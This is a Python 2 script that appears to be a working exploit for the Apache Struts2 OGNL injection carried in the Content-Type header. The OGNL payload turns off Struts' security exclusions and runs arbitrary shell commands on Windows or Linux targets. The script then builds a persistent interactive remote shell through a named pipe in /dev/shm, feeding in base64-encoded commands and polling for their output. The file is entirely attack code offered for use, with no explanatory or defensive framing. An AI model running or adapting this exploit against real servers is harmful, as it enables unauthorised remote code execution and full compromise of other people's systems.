#!/bin/python2

import base64
import random
import urllib2
import httplib
import socket
import sys
import threading
import time

class FifoShell:
    def _exec(self, cmd, timeout=1):
        payload = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % cmd
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"

        try:
            headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
            request = urllib2.Request(self.url, headers=headers)
            page = urllib2.urlopen(request, timeout=timeout).read()
            
        except httplib.IncompleteRead, e:
            page = e.partial
        except socket.timeout:
            page = None
            pass

        return page


    def _thread_read_output(self):
        while True:
            result = self._exec("cat %s && cat /dev/null > %s" % (self.stdout, self.stdout))
            if result:
                print result,
                #self._exec("cat /dev/null > %s" % self.stdout)
            time.sleep(self.timeout)


    def __init__(self, url, timeout=0.5):
        # id for inpiut/output pipes
        io_id = str(random.random())[2:]
        self.stdin = '/dev/shm/%s.in' % io_id
        self.stdout = '/dev/shm/%s.out' % io_id
        self.url = url
        self.timeout = timeout

        self._exec("mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (self.stdin, self.stdin, self.stdout))
        thread = threading.Thread(target=self._thread_read_output)
        thread.daemon = True
        thread.start()


    def exec_cmd(self, cmd):
        cmd_b64 = base64.b64encode('%s\n' % cmd)
        self._exec("echo %s | base64 -d >> %s" % (cmd_b64, self.stdin))
        time.sleep(self.timeout * 1.5)
    


url = sys.argv[1]
shell = FifoShell(url)

while True:
    cmd = raw_input("$ ")

    if cmd == "exit":
        sys.exit(0)
    else:
        shell.exec_cmd(cmd)
